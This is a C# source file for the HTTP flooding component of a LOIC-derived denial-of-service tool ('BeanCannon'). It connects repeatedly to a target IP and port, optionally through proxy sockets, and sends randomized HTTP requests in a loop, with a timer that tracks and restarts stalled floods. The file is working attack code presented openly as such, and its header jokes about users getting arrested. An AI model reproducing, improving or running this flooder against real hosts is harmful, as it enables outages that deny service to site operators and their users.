/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using BeanCannon.BusinessLogic.Core.Attacks.Settings;
using BeanCannon.BusinessLogic.Core.Extensions;
using BeanCannon.BusinessLogic.Core.Factory;
using BeanCannon.BusinessLogic.Core.Net.Interfaces;
using BeanCannon.BusinessLogic.Core.Randomizers;
using Org.Mentalis.Network.ProxySocket;
using System;
using System.ComponentModel;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Timers;

namespace BeanCannon.BusinessLogic.Core.Attacks
{
	public class HTTPFlooder : BaseFlooder<HTTPFlooderSettings>
	{
		private Timer timepoll;
		private bool showStats;

		public HTTPFlooder(HTTPFlooderSettings settings) : base(settings)
		{

		}

		private ProxySocket CurrentProxySocket { get; set; }

		public override void BeforeStart()
		{
			Clock.Start();

			timepoll = new Timer();
			timepoll.Elapsed += Timepoll_Elapsed;
			timepoll.Start();
		}

		public override void Stop()
		{
			base.Stop();

			timepoll.Stop();
			timepoll.Enabled = false;
		}

		private void Timepoll_Elapsed(object sender, ElapsedEventArgs e)
		{
			// Protect against race condition
			if (showStats) return; showStats = true;

			// TODO: Set parent thread's name also
			var currentThread = System.Threading.Thread.CurrentThread;
			if (String.IsNullOrEmpty(currentThread.Name))
			{
				currentThread.Name = $"Flooder-TimePoll-{currentThread.ManagedThreadId}";
			}

			if (Clock.Elapsed > Settings.Timeout)
			{
				/*
				Logger.Log.Warn(new
				{
					Message = "Flooder task expired after a period of time",
					settings.Timeout
				});
				*/

				State.Failed++;
				State.Status = RequestStatus.Failed;

				timepoll.Stop();
				if (State.IsFlooding)
				{
					timepoll.Start();

					var currentProxySocket = this.CurrentProxySocket;
					if (null != currentProxySocket)
					{
						Logger.Log.Warn(new
						{
							Message = "Flooder task expired after a period of time",
							Timeout = Settings.Timeout,
							ProxyIp = currentProxySocket.ProxyDatum.Ip,
							ProxyPort = currentProxySocket.ProxyDatum.Port
						});

						//currentProxySocket.InvalidateInStoreProxy();

						this.Stop();
					}
				}
			}

			showStats = false;
		}

		protected override void OnDoWorkEvent(object sender, DoWorkEventArgs e)
		{
			try
			{
				IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(Settings.Ip), Settings.Port);
				while (State.IsFlooding)
				{
					State.Status = RequestStatus.Ready; // SET STATE TO READY //

					Clock.Restart();

					byte[] recvBuf = new byte[128];

					State.Status = RequestStatus.Aquiring; // SET STATE TO AQUIRING //

					using (ISocket socket = SocketFactory.Instance.GetSocket(endPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp, Settings.ProxyConnectionType))
					{
						this.CurrentProxySocket = socket as ProxySocket;

						socket.NoDelay = true;
						State.Status = RequestStatus.Connecting; // SET STATE TO CONNECTING //

						try
						{
							socket.WrappedConnect(endPoint);
						}
						catch (Exception)
						{
							goto _continue;
						}

						byte[] headerBuffer = RandomizerHq.RandomHttpHeader(
							Settings.HttpRequestMethod,
							Settings.UrlPath,
							Settings.Host,
							Settings.UseRandomPath,
							Settings.AllowGzip
							);

						socket.Blocking = Settings.WaitReply;
						State.Status = RequestStatus.Requesting; // SET STATE TO REQUESTING //

						try
						{
							socket.Send(headerBuffer, SocketFlags.None);

							// SET STATE TO DOWNLOADING // REQUESTED++
							State.Status = RequestStatus.Downloading;
							State.Requested++;

							if (Settings.WaitReply)
							{
								socket.ReceiveTimeout = (int)Settings.Timeout.TotalMilliseconds;
								socket.Receive(recvBuf, recvBuf.Length, SocketFlags.None);
							}
						}
						catch (SocketException)
						{
							goto _continue;
						}
					}

					// SET STATE TO COMPLETED // DOWNLOADED++
					State.Status = RequestStatus.Completed;
					State.Downloaded++;

					State.TotalElepsedTime += Clock.Elapsed;

					timepoll.Stop();
					timepoll.Start();

					_continue:
					System.Threading.Thread.Sleep(Settings.Delay);
				}
			}
			// Analysis disable once EmptyGeneralCatchClause
			catch (Exception ex)
			{
				Logger.Log.Error(ex.Message, ex);
			}
			finally
			{
				timepoll.Stop();
				State.Status = RequestStatus.Ready;
				State.IsFlooding = false;
			}
		}
	}
}
